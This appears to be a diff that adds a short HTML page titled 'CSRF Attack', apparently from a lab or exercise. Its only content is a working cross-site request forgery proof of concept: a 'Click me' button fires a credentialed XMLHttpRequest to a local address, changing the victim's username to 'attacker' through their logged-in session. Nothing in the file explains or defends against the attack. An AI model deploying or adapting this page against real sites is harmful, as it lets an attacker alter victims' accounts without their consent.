@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <button onclick="attack()">Click me</button>
+    <script>
+        function attack() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "http://192.168.0.113/change_username?new_username=attacker", true);
+	    xhr.withCredentials = true;
+            xhr.send();
+        }
+    </script>
+</body>
+</html>
